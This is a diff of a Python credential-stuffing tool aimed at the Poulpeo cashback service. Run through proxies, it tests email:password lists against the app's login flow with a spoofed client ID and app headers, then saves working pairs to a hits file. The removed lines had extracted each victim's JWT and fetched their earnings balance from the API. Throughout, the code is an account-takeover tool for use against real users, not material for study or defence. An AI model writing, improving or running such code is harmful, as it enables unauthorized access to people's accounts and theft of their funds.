@@ -24,10 +24,6 @@ INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
 
 HITS_FILENAME = "hit.txt"
 
-OPENDATA_CLIENT_ID = "als52f20495d05ac2.56394549"
-
-EARNINGS_URL = "https://api.poulpeo.com/1.0/app/me/earnings"
-
 # =========================================================
 # HITS FILE (append en direct, thread-safe)
 # =========================================================
@@ -43,11 +39,8 @@ class HitWriter:
             with open(self._path, "w", encoding="utf-8"):
                 pass
 
-    def append_hit(self, email, password, solde=None):
-        if solde is not None:
-            line = f"{email}:{password} | {solde:.2f}\n"
-        else:
-            line = f"{email}:{password}\n"
+    def append_hit(self, email, password):
+        line = f"{email}:{password}\n"
         with self._lock:
             with open(self._path, "a", encoding="utf-8") as f:
                 f.write(line)
@@ -64,15 +57,12 @@ class RunStats:
         self.valid = 0
         self.invalid = 0
         self.error = 0
-        self.solde_total = 0.0
         self._start = time.monotonic()
 
-    def record(self, kind, solde=None):
+    def record(self, kind):
         with self._lock:
             if kind == "valid":
                 self.valid += 1
-                if solde is not None:
-                    self.solde_total += float(solde)
             elif kind == "invalid":
                 self.invalid += 1
             else:
@@ -81,19 +71,17 @@ class RunStats:
     def snapshot(self):
         with self._lock:
             v, inv, err = self.valid, self.invalid, self.error
-            st = self.solde_total
         total = v + inv + err
         elapsed = max(time.monotonic() - self._start, 1e-9)
         cpm = total / elapsed * 60.0
-        return cpm, v, inv, err, total, st
+        return cpm, v, inv, err, total
 
 
 def _stats_loop(stats, stop):
     while not stop.wait(0.2):
-        cpm, v, inv, err, total, solde = stats.snapshot()
+        cpm, v, inv, err, total = stats.snapshot()
         print(
-            f"\rCPM: {cpm:.0f} | Valid: {v} | Invalid: {inv} | Error: {err} | "
-            f"Total: {total} | Solde Σ: {solde:.2f}€",
+            f"\rCPM: {cpm:.0f} | Valid: {v} | Invalid: {inv} | Error: {err} | Total: {total}",
             end="",
             flush=True,
         )
@@ -240,100 +228,6 @@ LOGIN_URL = (
 
 _STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')
 
-_JWT_RE = re.compile(
-    r"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"
-)
-
-
-def extract_bearer_token(login_body: str):
-    if not login_body:
-        return None
-    try:
-        data = json.loads(login_body)
-
-        def scan(obj, depth=0):
-            if depth > 7:
-                return None
-            if isinstance(obj, dict):
-                for key in (
-                    "access_token",
-                    "token",
-                    "bearer_token",
-                    "jwt",
-                    "auth_token",
-                    "id_token",
-                ):
-                    val = obj.get(key)
-                    if isinstance(val, str) and val.startswith("eyJ"):
-                        return val
-                for v in obj.values():
-                    hit = scan(v, depth + 1)
-                    if hit:
-                        return hit
-            elif isinstance(obj, list):
-                for item in obj:
-                    hit = scan(item, depth + 1)
-                    if hit:
-                        return hit
-            return None
-
-        if isinstance(data, (dict, list)):
-            t = scan(data)
-            if t:
-                return t
-    except json.JSONDecodeError:
-        pass
-
-    m = _JWT_RE.search(login_body)
-    if m:
-        return m.group(1)
-    return None
-
-
-def parse_earnings_amount(earnings_body: str):
-    try:
-        payload = json.loads(earnings_body)
-        rows = payload.get("data")
-        if not isinstance(rows, list):
-            return None
-        total = 0.0
-        found = False
-        for row in rows:
-            if not isinstance(row, dict):
-                continue
-            attrs = row.get("attributes")
-            if isinstance(attrs, dict) and "amount" in attrs:
-                total += float(attrs["amount"])
-                found = True
-        return total if found else None
-    except (json.JSONDecodeError, TypeError, ValueError):
-        return None
-
-
-EARNINGS_HEADERS = {
-    "Accept-Charset": "UTF-8",
-    "Accept-Language": "fr-FR,fr;q=0.9",
-    "X-CLIENT-VERSION": "26.1.5",
-    "X-CLIENT-ID": OPENDATA_CLIENT_ID,
-    "Accept": "application/json",
-    "Connection": "keep-alive",
-    "User-Agent": (
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) "
-        "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
-    ),
-    "Accept-Encoding": "gzip, deflate, br",
-}
-
-
-def fetch_earnings_balance(session, bearer_token):
-    headers = EARNINGS_HEADERS.copy()
-    headers["Authorization"] = f"Bearer {bearer_token}"
-    url = f"{EARNINGS_URL}?offset=0&limit=1"
-    response = session.get(url, headers=headers)
-    if response.status_code != 200:
-        return None
-    return parse_earnings_amount(response.text or "")
-
 
 def fetch_request_token(session):
     request_token_body = {
@@ -372,7 +266,7 @@ def fetch_request_token(session):
 
 def post_login(session, oauth_token, oauth_token_secret, email, password):
     opendata = {
-        "client_id": OPENDATA_CLIENT_ID,
+        "client_id": "als52f20495d05ac2.56394549",
         "application": {
             "advertiser_id": str(uuid.uuid4()).upper(),
             "version": "26.1.5"
@@ -463,14 +357,8 @@ def process_account(email, password, proxy_url, stats, hit_writer):
         )
         kind = classify_login_response(response)
         if kind == "valid":
-            jwt = extract_bearer_token(response.text or "")
-            solde = None
-            if jwt:
-                solde = fetch_earnings_balance(session, jwt)
-            hit_writer.append_hit(email, password, solde)
-            stats.record("valid", solde=solde)
-        else:
-            stats.record(kind)
+            hit_writer.append_hit(email, password)
+        stats.record(kind)
     except Exception:
         stats.record("error")
 
@@ -538,10 +426,9 @@ def main():
         stop_stats.set()
         printer.join(timeout=1.0)
 
-    cpm, v, inv, err, total, solde = stats.snapshot()
+    cpm, v, inv, err, total = stats.snapshot()
     print(
-        f"\rCPM: {cpm:.0f} | Valid: {v} | Invalid: {inv} | Error: {err} | "
-        f"Total: {total} | Solde Σ: {solde:.2f}€"
+        f"\rCPM: {cpm:.0f} | Valid: {v} | Invalid: {inv} | Error: {err} | Total: {total}"
     )
 
 
